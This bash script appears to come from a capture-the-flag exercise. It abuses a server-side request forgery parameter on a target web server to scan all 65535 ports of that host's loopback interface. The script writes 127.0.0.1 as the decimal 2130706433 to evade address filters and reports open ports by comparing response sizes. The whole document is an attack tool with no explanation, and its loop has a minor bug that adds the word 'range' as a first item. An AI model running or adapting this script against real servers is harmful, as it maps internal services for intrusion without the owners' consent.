#!/bin/bash
for x in range {1..65535};
	do cmd=$(curl -so /dev/null http://10.10.214.99:8000/attack?url=http://2130706433:${x} -w '%{size_download}');
	if [ $cmd != 1045 ]; then
		echo "open port: $x"
	fi
done
